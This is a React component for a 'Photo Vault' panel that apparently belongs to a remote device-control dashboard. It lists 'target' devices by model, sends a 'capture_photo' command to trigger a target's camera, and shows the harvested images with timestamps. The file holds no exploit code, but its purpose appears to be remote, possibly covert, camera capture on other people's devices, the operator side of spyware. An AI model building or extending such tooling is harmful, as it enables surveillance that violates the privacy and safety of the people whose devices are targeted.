'use client';

import { useState } from 'react';
import { Camera, X, Image as ImageIcon, ChevronDown } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { useImageCaptures } from '@/hooks/useFirebase';
import { sendCommand } from '@/services/targetService';
import { toast } from '@/lib/toast';
import { Target } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

interface PhotoGalleryProps {
  targetId?: string;
  targets?: Target[];
  onTargetChange?: (targetId: string) => void;
}

export default function PhotoGallery({ targetId, targets = [], onTargetChange }: PhotoGalleryProps) {
  const { images, isLoading } = useImageCaptures(targetId);
  const [sending, setSending] = useState(false);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [showDeviceDropdown, setShowDeviceDropdown] = useState(false);

  const handleCapture = async () => {
    if (!targetId) return;
    setSending(true);
    try {
      await sendCommand(targetId, 'capture_photo');
      toast.success('Triggering camera on target...');
    } catch (error) {
      toast.error('Failed to send capture command.');
    } finally {
      setSending(false);
    }
  };

  return (
    <>
      <div className="rounded-2xl border border-white/[0.06] bg-white/[0.02] backdrop-blur-xl p-5">
        {/* ── Header ── */}
        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between mb-5">
          <div>
            <h3 className="text-lg font-bold text-white">Photo Vault</h3>
            <p className="text-[11px] text-slate-500 mt-0.5">
              {images.length} photo{images.length !== 1 ? 's' : ''} captured
            </p>
          </div>

          <div className="flex items-center gap-2">
            {/* Device filter */}
            {targets.length > 0 && (
              <div className="relative">
                <button
                  onClick={() => setShowDeviceDropdown(!showDeviceDropdown)}
                  className={cn(
                    'inline-flex items-center gap-1.5 rounded-lg border px-3 py-2 text-xs font-medium transition-all',
                    showDeviceDropdown
                      ? 'border-emerald-500/30 bg-emerald-500/[0.08] text-emerald-400'
                      : 'border-white/[0.08] bg-white/[0.03] text-slate-400 hover:border-white/[0.15]'
                  )}
                >
                  <span className="max-w-[80px] truncate">
                    {targetId && targets.find(t => t.id === targetId)
                      ? targets.find(t => t.id === targetId)?.deviceInfo?.model || 'Device'
                      : 'Filter'
                    }
                  </span>
                  <ChevronDown size={12} className={cn('transition-transform', showDeviceDropdown && 'rotate-180')} />
                </button>

                {showDeviceDropdown && (
                  <div className="absolute right-0 mt-1.5 w-44 rounded-xl border border-white/[0.08] bg-slate-950/98 shadow-xl z-50 backdrop-blur-2xl overflow-hidden">
                    <div className="max-h-[240px] overflow-y-auto">
                      {targets.map((device) => (
                        <button
                          key={device.id}
                          onClick={() => {
                            onTargetChange?.(device.id);
                            setShowDeviceDropdown(false);
                          }}
                          className={cn(
                            'w-full px-3 py-2.5 text-left transition-colors border-b border-white/[0.04] last:border-0',
                            targetId === device.id
                              ? 'bg-emerald-500/10 text-emerald-400'
                              : 'text-slate-400 hover:bg-white/[0.04]'
                          )}
                        >
                          <div className="text-[10px] text-slate-500 font-mono truncate">{device.id}</div>
                          <div className="text-xs font-semibold mt-0.5 truncate">
                            {device.deviceInfo?.model || 'Unknown'}
                          </div>
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            <button
              type="button"
              onClick={handleCapture}
              disabled={Boolean(!targetId || sending)}
              className={cn(
                'inline-flex items-center gap-1.5 rounded-lg border px-3 py-2 text-xs font-semibold transition-all',
                'border-emerald-500/20 bg-emerald-500/[0.06] text-emerald-400 hover:border-emerald-500/40 hover:bg-emerald-500/10',
                (!targetId || sending) && 'cursor-not-allowed opacity-40'
              )}
            >
              <Camera size={13} />
              {sending ? 'Sending...' : 'Capture'}
            </button>
          </div>
        </div>

        {/* ── Photo Grid ── */}
        <div className="grid grid-cols-2 gap-2 max-h-[500px] overflow-y-auto pr-1">
          {isLoading ? (
             [...Array(4)].map((_, i) => (
               <div key={i} className="aspect-square rounded-xl bg-white/[0.03] animate-pulse border border-white/[0.04]" />
             ))
          ) : !targetId ? (
            <div className="col-span-2 py-16 text-center text-slate-600 text-sm">Select a target to view photos</div>
          ) : images.length === 0 ? (
            <div className="col-span-2 py-16 text-center flex flex-col items-center gap-2">
               <ImageIcon size={28} className="text-slate-700" />
               <p className="text-slate-600 text-xs">No photos captured yet</p>
            </div>
          ) : (
            images.map((img) => (
              <div key={img.id} className="group relative aspect-square rounded-xl overflow-hidden border border-white/[0.06] bg-black/30">
                <img
                  src={img.url}
                  alt="Capture"
                  className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105 cursor-zoom-in"
                  onClick={() => setSelectedImage(img.url)}
                />
                <div className="absolute inset-x-0 bottom-0 p-2.5 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                   <p className="text-[10px] text-white/80 font-mono">{new Date(img.timestamp).toLocaleString()}</p>
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {/* ── Lightbox ── */}
      {selectedImage && (
        <div
          className="fixed inset-0 z-[100] bg-black/95 backdrop-blur-md flex items-center justify-center p-4"
          onClick={() => setSelectedImage(null)}
        >
          <button className="absolute top-6 right-6 text-white/40 hover:text-white transition-colors">
            <X size={28} />
          </button>
          <img src={selectedImage} className="max-w-full max-h-full rounded-xl shadow-2xl border border-white/[0.06]" alt="Full view" />
        </div>
      )}
    </>
  );
}
